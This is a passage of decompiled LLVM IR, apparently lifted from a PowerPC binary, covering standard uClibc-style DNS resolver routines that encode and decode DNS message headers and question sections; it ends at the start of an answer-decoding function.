  %v0_10013954 = phi i32 [ 0, %dec_label_pc_10013880 ], [ %storemerge1, %dec_label_pc_10013938 ], [ %v0_10013954.pre, %dec_label_pc_1001391c ], [ 0, %dec_label_pc_10013940 ]
  ret i32 %v0_10013954

; uselistorder directives
  uselistorder i32 %v2_10013914, { 1, 0 }
  uselistorder i32 %v2_100138e8, { 1, 0 }
  uselistorder i1 %v3_10013808, { 0, 2, 1 }
  uselistorder i32 %v0_10013808, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100138d4, { 2, 1, 0 }
  uselistorder i32 %v0_1001388c66, { 1, 0 }
  uselistorder i32 %v3_10013890, { 1, 0 }
  uselistorder i32 %v0_1001385c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001384c.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10013848, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10013818, { 1, 0 }
  uselistorder i32 %v0_10013838, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10013818, { 0, 2, 1 }
  uselistorder i32 %v2_10013844, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100138083, { 0, 2, 1 }
  uselistorder i32 %v0_100137f0, { 2, 1, 0 }
  uselistorder i32 %v0_100137e0.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_100137e8, { 1, 0, 2 }
  uselistorder i32 %v1_100137c4, { 2, 1, 0 }
  uselistorder i32 %v1_100137c0, { 1, 0 }
  uselistorder i32 %v0_100137a439, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_100137b442, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10013778, { 1, 0 }
  uselistorder i32 %v0_100137c0, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10013778, { 1, 0 }
  uselistorder i32 %v0_100137a4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_100137b4, { 2, 3, 0, 1 }
  uselistorder i32 %v1_10013754, { 1, 0 }
  uselistorder i32 %v2_1001374c, { 1, 0 }
  uselistorder i32 %v0_10013744, { 1, 0, 2 }
  uselistorder i32 %v1_1001372c, { 1, 0 }
  uselistorder i32 %v2_10013708, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 16, 12, 18, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 16, 12, 18, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 9, 8, 6, 0, 7, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 0, 1 }
  uselistorder i32* @r8, { 4, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 58, 59, 60, 61, 39, 63, 64, 65, 62, 40, 41, 42, 43, 44, 45, 46, 2, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0, 57, 3, 5 }
  uselistorder i32* @r7, { 10, 12, 13, 14, 0, 15, 16, 17, 18, 1, 19, 20, 6, 21, 22, 23, 24, 2, 36, 37, 38, 8, 25, 26, 27, 28, 29, 30, 31, 32, 3, 33, 7, 4, 5, 34, 35, 9, 11 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 10, 0, 11, 12, 13, 7, 8, 9, 5, 6, 14 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 24, 23, 9, 2, 6, 5, 15, 0, 12, 1, 14, 22, 21, 20, 19, 18, 17, 16, 4, 3, 13, 8, 7, 11, 10 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10013950, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10013938, { 1, 0 }
  uselistorder label %dec_label_pc_10013900, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100138d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100138b0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10013808, { 1, 0 }
  uselistorder label %dec_label_pc_100137fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100137e0, { 1, 0 }
  uselistorder label %dec_label_pc_100137c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100137bc, { 1, 0 }
  uselistorder label %dec_label_pc_10013774, { 1, 0 }
  uselistorder label %dec_label_pc_1001372c, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10013a4c, label %dec_label_pc_10013974

dec_label_pc_10013974:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10013974 = add i32 %tmp, 2
  %v2_10013974 = inttoptr i32 %v1_10013974 to i8*
  %v3_10013974 = load i8, i8* %v2_10013974, align 1
  %v4_10013974 = zext i8 %v3_10013974 to i32
  store i32 %v4_10013974, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10013974, i8* %tmp3, align 1
  %v2_10013980 = load i32, i32* %arg1, align 4
  store i32 %v2_10013980, i32* %r0.global-to-local, align 4
  %v1_10013984 = trunc i32 %v2_10013980 to i8
  %v4_10013984 = add i32 %arg2, 1
  %v5_10013984 = inttoptr i32 %v4_10013984 to i8*
  store i8 %v1_10013984, i8* %v5_10013984, align 1
  %v1_10013988 = add i32 %tmp, 12
  %v2_10013988 = inttoptr i32 %v1_10013988 to i32*
  %v3_10013988 = load i32, i32* %v2_10013988, align 4
  store i32 %v3_10013988, i32* %r0.global-to-local, align 4
  %v1_1001398c = add i32 %tmp, 16
  %v2_1001398c = inttoptr i32 %v1_1001398c to i32*
  %v3_1001398c = load i32, i32* %v2_1001398c, align 4
  store i32 %v3_1001398c, i32* %r11.global-to-local, align 4
  %v1_10013990 = add i32 %tmp, 4
  %v2_10013990 = inttoptr i32 %v1_10013990 to i32*
  %v3_10013990 = load i32, i32* %v2_10013990, align 4
  %v2_10013994 = icmp ne i32 %v3_10013988, 0
  %v5_10013998 = zext i1 %v2_10013994 to i32
  store i32 %v5_10013998, i32* %r10.global-to-local, align 4
  %v1_1001399c = add i32 %tmp, 8
  %v2_1001399c = inttoptr i32 %v1_1001399c to i32*
  %v3_1001399c = load i32, i32* %v2_1001399c, align 4
  %v2_100139a0 = icmp ne i32 %v3_1001398c, 0
  %v5_100139a4 = zext i1 %v2_100139a0 to i32
  %v1_100139a8 = add i32 %tmp, 20
  %v2_100139a8 = inttoptr i32 %v1_100139a8 to i32*
  %v3_100139a8 = load i32, i32* %v2_100139a8, align 4
  store i32 %v3_100139a8, i32* %r0.global-to-local, align 4
  %not.v2_100139ac = icmp eq i32 %v3_10013990, 0
  %v6_100139b0 = sext i1 %not.v2_100139ac to i32
  store i32 %v5_100139a4, i32* %r11.global-to-local, align 4
  %v1_100139b8 = call i32 @__asm_rlwinm(i32 %v6_100139b0, i32 0, i32 24, i32 24)
  %v0_100139bc = load i32, i32* %r10.global-to-local, align 4
  %v1_100139bc = mul i32 %v0_100139bc, 4
  store i32 %v1_100139bc, i32* %r10.global-to-local, align 4
  %v1_100139c0 = call i32 @__asm_rlwinm(i32 %v3_1001399c, i32 3, i32 25, i32 28)
  %v0_100139c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100139c4 = icmp ne i32 %v0_100139c4, 0
  %v5_100139c8 = zext i1 %v2_100139c4 to i32
  %v2_100139cc = or i32 %v1_100139bc, %v1_100139c0
  store i32 %v2_100139cc, i32* %r10.global-to-local, align 4
  %v1_100139d0 = add i32 %v1_100139b8, 128
  %v0_100139d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100139d4 = mul i32 %v0_100139d4, 2
  store i32 %v1_100139d4, i32* %r11.global-to-local, align 4
  %v2_100139d8 = or i32 %v2_100139cc, %v5_100139c8
  store i32 %v2_100139d8, i32* %r0.global-to-local, align 4
  %v2_100139dc = or i32 %v2_100139d8, %v1_100139d0
  %v2_100139e0 = or i32 %v2_100139dc, %v1_100139d4
  %v1_100139e4 = trunc i32 %v2_100139e0 to i8
  %v4_100139e4 = add i32 %arg2, 2
  %v5_100139e4 = inttoptr i32 %v4_100139e4 to i8*
  store i8 %v1_100139e4, i8* %v5_100139e4, align 1
  %v1_100139e8 = add i32 %tmp, 24
  %v2_100139e8 = inttoptr i32 %v1_100139e8 to i32*
  %v3_100139e8 = load i32, i32* %v2_100139e8, align 4
  %v1_100139ec = add i32 %tmp, 28
  %v2_100139ec = inttoptr i32 %v1_100139ec to i32*
  %v3_100139ec = load i32, i32* %v2_100139ec, align 4
  store i32 %v3_100139ec, i32* %r0.global-to-local, align 4
  %not.v2_100139f0 = icmp eq i32 %v3_100139e8, 0
  %v6_100139f4 = sext i1 %not.v2_100139f0 to i32
  %v1_100139f8 = call i32 @__asm_rlwinm(i32 %v6_100139f4, i32 0, i32 24, i32 24)
  %v1_100139fc = urem i32 %v3_100139ec, 16
  store i32 %v1_100139fc, i32* %r0.global-to-local, align 4
  %v1_10013a00 = add i32 %v1_100139f8, 128
  %v2_10013a04 = or i32 %v1_100139fc, %v1_10013a00
  %v1_10013a08 = trunc i32 %v2_10013a04 to i8
  %v4_10013a08 = add i32 %arg2, 3
  %v5_10013a08 = inttoptr i32 %v4_10013a08 to i8*
  store i8 %v1_10013a08, i8* %v5_10013a08, align 1
  %v1_10013a0c = add i32 %tmp, 34
  %v2_10013a0c = inttoptr i32 %v1_10013a0c to i8*
  %v3_10013a0c = load i8, i8* %v2_10013a0c, align 1
  %v4_10013a0c = zext i8 %v3_10013a0c to i32
  store i32 %v4_10013a0c, i32* %r0.global-to-local, align 4
  %v4_10013a10 = add i32 %arg2, 4
  %v5_10013a10 = inttoptr i32 %v4_10013a10 to i8*
  store i8 %v3_10013a0c, i8* %v5_10013a10, align 1
  %v1_10013a14 = add i32 %tmp, 32
  %v2_10013a14 = inttoptr i32 %v1_10013a14 to i32*
  %v3_10013a14 = load i32, i32* %v2_10013a14, align 4
  store i32 %v3_10013a14, i32* %r0.global-to-local, align 4
  %v1_10013a18 = trunc i32 %v3_10013a14 to i8
  %v4_10013a18 = add i32 %arg2, 5
  %v5_10013a18 = inttoptr i32 %v4_10013a18 to i8*
  store i8 %v1_10013a18, i8* %v5_10013a18, align 1
  %v1_10013a1c = add i32 %tmp, 38
  %v2_10013a1c = inttoptr i32 %v1_10013a1c to i8*
  %v3_10013a1c = load i8, i8* %v2_10013a1c, align 1
  %v4_10013a1c = zext i8 %v3_10013a1c to i32
  store i32 %v4_10013a1c, i32* %r0.global-to-local, align 4
  %v4_10013a20 = add i32 %arg2, 6
  %v5_10013a20 = inttoptr i32 %v4_10013a20 to i8*
  store i8 %v3_10013a1c, i8* %v5_10013a20, align 1
  %v1_10013a24 = add i32 %tmp, 36
  %v2_10013a24 = inttoptr i32 %v1_10013a24 to i32*
  %v3_10013a24 = load i32, i32* %v2_10013a24, align 4
  store i32 %v3_10013a24, i32* %r0.global-to-local, align 4
  %v1_10013a28 = trunc i32 %v3_10013a24 to i8
  %v4_10013a28 = add i32 %arg2, 7
  %v5_10013a28 = inttoptr i32 %v4_10013a28 to i8*
  store i8 %v1_10013a28, i8* %v5_10013a28, align 1
  %v1_10013a2c = add i32 %tmp, 42
  %v2_10013a2c = inttoptr i32 %v1_10013a2c to i8*
  %v3_10013a2c = load i8, i8* %v2_10013a2c, align 1
  %v4_10013a2c = zext i8 %v3_10013a2c to i32
  store i32 %v4_10013a2c, i32* %r0.global-to-local, align 4
  %v4_10013a30 = add i32 %arg2, 8
  %v5_10013a30 = inttoptr i32 %v4_10013a30 to i8*
  store i8 %v3_10013a2c, i8* %v5_10013a30, align 1
  %v1_10013a34 = add i32 %tmp, 40
  %v2_10013a34 = inttoptr i32 %v1_10013a34 to i32*
  %v3_10013a34 = load i32, i32* %v2_10013a34, align 4
  store i32 %v3_10013a34, i32* %r0.global-to-local, align 4
  %v1_10013a38 = trunc i32 %v3_10013a34 to i8
  %v4_10013a38 = add i32 %arg2, 9
  %v5_10013a38 = inttoptr i32 %v4_10013a38 to i8*
  store i8 %v1_10013a38, i8* %v5_10013a38, align 1
  %v1_10013a3c = add i32 %tmp, 46
  %v2_10013a3c = inttoptr i32 %v1_10013a3c to i8*
  %v3_10013a3c = load i8, i8* %v2_10013a3c, align 1
  %v4_10013a3c = zext i8 %v3_10013a3c to i32
  store i32 %v4_10013a3c, i32* %r0.global-to-local, align 4
  %v4_10013a40 = add i32 %arg2, 10
  %v5_10013a40 = inttoptr i32 %v4_10013a40 to i8*
  store i8 %v3_10013a3c, i8* %v5_10013a40, align 1
  %v1_10013a44 = add i32 %tmp, 44
  %v2_10013a44 = inttoptr i32 %v1_10013a44 to i32*
  %v3_10013a44 = load i32, i32* %v2_10013a44, align 4
  store i32 %v3_10013a44, i32* %r0.global-to-local, align 4
  %v1_10013a48 = trunc i32 %v3_10013a44 to i8
  %v4_10013a48 = add i32 %arg2, 11
  %v5_10013a48 = inttoptr i32 %v4_10013a48 to i8*
  store i8 %v1_10013a48, i8* %v5_10013a48, align 1
  %v0_10013a4c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10013a4c

dec_label_pc_10013a4c:                            ; preds = %entry, %dec_label_pc_10013974
  %v0_10013a4c = phi i32 [ -1, %entry ], [ %v0_10013a4c.pre, %dec_label_pc_10013974 ]
  ret i32 %v0_10013a4c

; uselistorder directives
  uselistorder i32 %v1_100139fc, { 1, 0 }
  uselistorder i32 %v1_100139d4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i32 38, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10013a4c, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10013a54 = load i8, i8* %arg1, align 1
  %v4_10013a54 = zext i8 %v3_10013a54 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10013a5c = add i32 %tmp, 1
  %v3_10013a5c = inttoptr i32 %v2_10013a5c to i8*
  %v4_10013a5c = load i8, i8* %v3_10013a5c, align 1
  %v5_10013a5c = zext i8 %v4_10013a5c to i32
  %v1_10013a64 = mul nuw nsw i32 %v4_10013a54, 256
  %v2_10013a68 = or i32 %v5_10013a5c, %v1_10013a64
  %v2_10013a6c = inttoptr i32 %arg2 to i32*
  store i32 %v2_10013a68, i32* %v2_10013a6c, align 4
  %v0_10013a70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a70 = add i32 %v0_10013a70, 2
  %v2_10013a70 = inttoptr i32 %v1_10013a70 to i8*
  %v3_10013a70 = load i8, i8* %v2_10013a70, align 1
  %v4_10013a70 = zext i8 %v3_10013a70 to i32
  %v1_10013a74 = call i32 @__asm_rlwinm(i32 %v4_10013a70, i32 25, i32 31, i32 31)
  %v2_10013a78 = add i32 %arg2, 4
  %v3_10013a78 = inttoptr i32 %v2_10013a78 to i32*
  store i32 %v1_10013a74, i32* %v3_10013a78, align 4
  %v0_10013a7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a7c = add i32 %v0_10013a7c, 2
  %v2_10013a7c = inttoptr i32 %v1_10013a7c to i8*
  %v3_10013a7c = load i8, i8* %v2_10013a7c, align 1
  %v4_10013a7c = zext i8 %v3_10013a7c to i32
  %v1_10013a80 = call i32 @__asm_rlwinm(i32 %v4_10013a7c, i32 29, i32 28, i32 31)
  %v2_10013a84 = add i32 %arg2, 8
  %v3_10013a84 = inttoptr i32 %v2_10013a84 to i32*
  store i32 %v1_10013a80, i32* %v3_10013a84, align 4
  %v0_10013a88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a88 = add i32 %v0_10013a88, 2
  %v2_10013a88 = inttoptr i32 %v1_10013a88 to i8*
  %v3_10013a88 = load i8, i8* %v2_10013a88, align 1
  %v4_10013a88 = zext i8 %v3_10013a88 to i32
  %v1_10013a8c = call i32 @__asm_rlwinm(i32 %v4_10013a88, i32 30, i32 31, i32 31)
  %v2_10013a90 = add i32 %arg2, 12
  %v3_10013a90 = inttoptr i32 %v2_10013a90 to i32*
  store i32 %v1_10013a8c, i32* %v3_10013a90, align 4
  %v0_10013a94 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a94 = add i32 %v0_10013a94, 2
  %v2_10013a94 = inttoptr i32 %v1_10013a94 to i8*
  %v3_10013a94 = load i8, i8* %v2_10013a94, align 1
  %v4_10013a94 = zext i8 %v3_10013a94 to i32
  %v1_10013a98 = call i32 @__asm_rlwinm(i32 %v4_10013a94, i32 31, i32 31, i32 31)
  %v2_10013a9c = add i32 %arg2, 16
  %v3_10013a9c = inttoptr i32 %v2_10013a9c to i32*
  store i32 %v1_10013a98, i32* %v3_10013a9c, align 4
  %v0_10013aa0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013aa0 = add i32 %v0_10013aa0, 2
  %v2_10013aa0 = inttoptr i32 %v1_10013aa0 to i8*
  %v3_10013aa0 = load i8, i8* %v2_10013aa0, align 1
  %tmp1 = urem i8 %v3_10013aa0, 2
  %v1_10013aa4 = zext i8 %tmp1 to i32
  %v2_10013aa8 = add i32 %arg2, 20
  %v3_10013aa8 = inttoptr i32 %v2_10013aa8 to i32*
  store i32 %v1_10013aa4, i32* %v3_10013aa8, align 4
  %v0_10013aac = load i32, i32* %r9.global-to-local, align 4
  %v1_10013aac = add i32 %v0_10013aac, 3
  %v2_10013aac = inttoptr i32 %v1_10013aac to i8*
  %v3_10013aac = load i8, i8* %v2_10013aac, align 1
  %v4_10013aac = zext i8 %v3_10013aac to i32
  %v1_10013ab0 = call i32 @__asm_rlwinm(i32 %v4_10013aac, i32 25, i32 31, i32 31)
  %v2_10013ab4 = add i32 %arg2, 24
  %v3_10013ab4 = inttoptr i32 %v2_10013ab4 to i32*
  store i32 %v1_10013ab0, i32* %v3_10013ab4, align 4
  %v0_10013ab8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ab8 = add i32 %v0_10013ab8, 3
  %v2_10013ab8 = inttoptr i32 %v1_10013ab8 to i8*
  %v3_10013ab8 = load i8, i8* %v2_10013ab8, align 1
  %tmp2 = urem i8 %v3_10013ab8, 16
  %v1_10013abc = zext i8 %tmp2 to i32
  %v2_10013ac0 = add i32 %arg2, 28
  %v3_10013ac0 = inttoptr i32 %v2_10013ac0 to i32*
  store i32 %v1_10013abc, i32* %v3_10013ac0, align 4
  %v0_10013ac4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ac4 = add i32 %v0_10013ac4, 4
  %v2_10013ac4 = inttoptr i32 %v1_10013ac4 to i8*
  %v3_10013ac4 = load i8, i8* %v2_10013ac4, align 1
  %v4_10013ac4 = zext i8 %v3_10013ac4 to i32
  %v1_10013ac8 = add i32 %v0_10013ac4, 5
  %v2_10013ac8 = inttoptr i32 %v1_10013ac8 to i8*
  %v3_10013ac8 = load i8, i8* %v2_10013ac8, align 1
  %v4_10013ac8 = zext i8 %v3_10013ac8 to i32
  %v1_10013acc = mul nuw nsw i32 %v4_10013ac4, 256
  %v2_10013ad0 = or i32 %v4_10013ac8, %v1_10013acc
  %v2_10013ad4 = add i32 %arg2, 32
  %v3_10013ad4 = inttoptr i32 %v2_10013ad4 to i32*
  store i32 %v2_10013ad0, i32* %v3_10013ad4, align 4
  %v0_10013ad8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ad8 = add i32 %v0_10013ad8, 6
  %v2_10013ad8 = inttoptr i32 %v1_10013ad8 to i8*
  %v3_10013ad8 = load i8, i8* %v2_10013ad8, align 1
  %v4_10013ad8 = zext i8 %v3_10013ad8 to i32
  %v1_10013adc = add i32 %v0_10013ad8, 7
  %v2_10013adc = inttoptr i32 %v1_10013adc to i8*
  %v3_10013adc = load i8, i8* %v2_10013adc, align 1
  %v4_10013adc = zext i8 %v3_10013adc to i32
  %v1_10013ae0 = mul nuw nsw i32 %v4_10013ad8, 256
  %v2_10013ae4 = or i32 %v4_10013adc, %v1_10013ae0
  %v2_10013ae8 = add i32 %arg2, 36
  %v3_10013ae8 = inttoptr i32 %v2_10013ae8 to i32*
  store i32 %v2_10013ae4, i32* %v3_10013ae8, align 4
  %v0_10013aec = load i32, i32* %r9.global-to-local, align 4
  %v1_10013aec = add i32 %v0_10013aec, 8
  %v2_10013aec = inttoptr i32 %v1_10013aec to i8*
  %v3_10013aec = load i8, i8* %v2_10013aec, align 1
  %v4_10013aec = zext i8 %v3_10013aec to i32
  %v1_10013af0 = add i32 %v0_10013aec, 9
  %v2_10013af0 = inttoptr i32 %v1_10013af0 to i8*
  %v3_10013af0 = load i8, i8* %v2_10013af0, align 1
  %v4_10013af0 = zext i8 %v3_10013af0 to i32
  %v1_10013af4 = mul nuw nsw i32 %v4_10013aec, 256
  %v2_10013af8 = or i32 %v4_10013af0, %v1_10013af4
  %v2_10013afc = add i32 %arg2, 40
  %v3_10013afc = inttoptr i32 %v2_10013afc to i32*
  store i32 %v2_10013af8, i32* %v3_10013afc, align 4
  %v0_10013b00 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013b00 = add i32 %v0_10013b00, 10
  %v2_10013b00 = inttoptr i32 %v1_10013b00 to i8*
  %v3_10013b00 = load i8, i8* %v2_10013b00, align 1
  %v4_10013b00 = zext i8 %v3_10013b00 to i32
  %v1_10013b04 = add i32 %v0_10013b00, 11
  %v2_10013b04 = inttoptr i32 %v1_10013b04 to i8*
  %v3_10013b04 = load i8, i8* %v2_10013b04, align 1
  %v4_10013b04 = zext i8 %v3_10013b04 to i32
  store i32 %v4_10013b04, i32* %r9.global-to-local, align 4
  %v1_10013b08 = mul nuw nsw i32 %v4_10013b00, 256
  %v2_10013b0c = or i32 %v4_10013b04, %v1_10013b08
  %v2_10013b10 = add i32 %arg2, 44
  %v3_10013b10 = inttoptr i32 %v2_10013b10 to i32*
  store i32 %v2_10013b0c, i32* %v3_10013b10, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 7, 8, 9, 5, 6, 12, 10, 11, 0, 1, 2, 3, 4 }
  uselistorder i32 11, { 13, 14, 6, 15, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4, 5 }
  uselistorder i32 7, { 8, 9, 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 5, { 17, 18, 8, 9, 10, 2, 3, 11, 0, 12, 13, 1, 15, 16, 4, 5, 6, 7, 14 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 14, 3, 5, 6, 7, 8, 0, 4, 9, 1, 2, 10, 11, 12, 13 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10013b34 = load i32, i32* %arg1, align 4
  store i32 %v2_10013b34, i32* %r3.global-to-local, align 4
  store i32 268516156, i32* @lr, align 4
  %v1_10013b38 = inttoptr i32 %v2_10013b34 to i8*
  %v2_10013b38 = call i32 @__encode_dotted(i8* %v1_10013b38)
  store i32 %v2_10013b38, i32* %r3.global-to-local, align 4
  %v1_10013b3c = icmp slt i32 %v2_10013b38, 0
  %v1_10013b40 = load i32, i32* @r29, align 4
  %v2_10013b40 = sub i32 %v1_10013b40, %v2_10013b38
  store i32 %v2_10013b40, i32* @r29, align 4
  br i1 %v1_10013b3c, label %dec_label_pc_10013b80, label %dec_label_pc_10013b4c

dec_label_pc_10013b4c:                            ; preds = %entry
  %v2_10013b44 = icmp sgt i32 %v2_10013b40, 3
  %v0_10013b4c = load i32, i32* @r30, align 4
  %v2_10013b4c = add i32 %v0_10013b4c, %v2_10013b38
  store i32 %v2_10013b4c, i32* %r9.global-to-local, align 4
  br i1 %v2_10013b44, label %dec_label_pc_10013b5c, label %dec_label_pc_10013b54

dec_label_pc_10013b54:                            ; preds = %dec_label_pc_10013b4c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b80

dec_label_pc_10013b5c:                            ; preds = %dec_label_pc_10013b4c
  %v0_10013b5c = load i32, i32* @r31, align 4
  %v1_10013b5c = add i32 %v0_10013b5c, 6
  %v2_10013b5c = inttoptr i32 %v1_10013b5c to i8*
  %v3_10013b5c = load i8, i8* %v2_10013b5c, align 1
  %v5_10013b60 = inttoptr i32 %v2_10013b4c to i8*
  store i8 %v3_10013b5c, i8* %v5_10013b60, align 1
  %v0_10013b64 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013b64 = add i32 %v0_10013b64, 4
  store i32 %v1_10013b64, i32* %r3.global-to-local, align 4
  %v0_10013b68 = load i32, i32* @r31, align 4
  %v1_10013b68 = add i32 %v0_10013b68, 4
  %v2_10013b68 = inttoptr i32 %v1_10013b68 to i32*
  %v3_10013b68 = load i32, i32* %v2_10013b68, align 4
  %v1_10013b6c = trunc i32 %v3_10013b68 to i8
  %v2_10013b6c = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b6c = add i32 %v2_10013b6c, 1
  %v4_10013b6c = inttoptr i32 %v3_10013b6c to i8*
  store i8 %v1_10013b6c, i8* %v4_10013b6c, align 1
  %v0_10013b70 = load i32, i32* @r31, align 4
  %v1_10013b70 = add i32 %v0_10013b70, 10
  %v2_10013b70 = inttoptr i32 %v1_10013b70 to i8*
  %v3_10013b70 = load i8, i8* %v2_10013b70, align 1
  %v2_10013b74 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b74 = add i32 %v2_10013b74, 2
  %v4_10013b74 = inttoptr i32 %v3_10013b74 to i8*
  store i8 %v3_10013b70, i8* %v4_10013b74, align 1
  %v0_10013b78 = load i32, i32* @r31, align 4
  %v1_10013b78 = add i32 %v0_10013b78, 8
  %v2_10013b78 = inttoptr i32 %v1_10013b78 to i32*
  %v3_10013b78 = load i32, i32* %v2_10013b78, align 4
  %v1_10013b7c = trunc i32 %v3_10013b78 to i8
  %v2_10013b7c = load i32, i32* %r9.global-to-local, align 4
  %v3_10013b7c = add i32 %v2_10013b7c, 3
  %v4_10013b7c = inttoptr i32 %v3_10013b7c to i8*
  store i8 %v1_10013b7c, i8* %v4_10013b7c, align 1
  %v0_10013b90.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013b80

dec_label_pc_10013b80:                            ; preds = %entry, %dec_label_pc_10013b54, %dec_label_pc_10013b5c
  %v0_10013b90 = phi i32 [ %v2_10013b38, %entry ], [ -1, %dec_label_pc_10013b54 ], [ %v0_10013b90.pre, %dec_label_pc_10013b5c ]
  ret i32 %v0_10013b90

; uselistorder directives
  uselistorder i32 %v2_10013b38, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 5, 3, 6, 4, 0 }
  uselistorder label %dec_label_pc_10013b80, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268516260, i32* @lr, align 4
  %v0_10013ba0 = call i32 @__length_dotted()
  %v1_10013ba4 = icmp slt i32 %v0_10013ba0, 0
  br i1 %v1_10013ba4, label %dec_label_pc_10013bb0, label %dec_label_pc_10013bac

dec_label_pc_10013bac:                            ; preds = %entry
  %v1_10013bac = add i32 %v0_10013ba0, 4
  br label %dec_label_pc_10013bb0

dec_label_pc_10013bb0:                            ; preds = %entry, %dec_label_pc_10013bac
  %v0_10013bbc = phi i32 [ %v0_10013ba0, %entry ], [ %v1_10013bac, %dec_label_pc_10013bac ]
  ret i32 %v0_10013bbc

; uselistorder directives
  uselistorder label %dec_label_pc_10013bb0, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10013bc4 = load i32, i32* @lr, align 4
  store i32 %v0_10013bc4, i32* %r0.global-to-local, align 4
